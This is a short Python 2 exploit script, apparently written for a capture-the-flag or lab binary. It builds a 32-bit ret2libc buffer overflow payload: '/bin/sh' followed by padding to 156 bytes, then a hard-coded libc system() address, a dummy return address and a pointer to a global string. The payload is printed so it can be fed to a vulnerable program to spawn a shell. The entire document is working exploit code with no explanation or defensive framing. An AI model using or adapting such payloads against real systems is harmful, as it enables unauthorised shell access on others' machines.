import struct

def p(x):
    return struct.pack("<I", x)

LIBC_SYSTEM = 0xb7e61310
GLOBAL_STR = 0x804a060
BIN_SH = "/bin/sh\x00"

payload = ""
payload += BIN_SH
payload += "A" * (156 - len(BIN_SH))
payload += p(LIBC_SYSTEM)
payload += p(0xDEADBEAF)
payload += p(GLOBAL_STR)

print payload
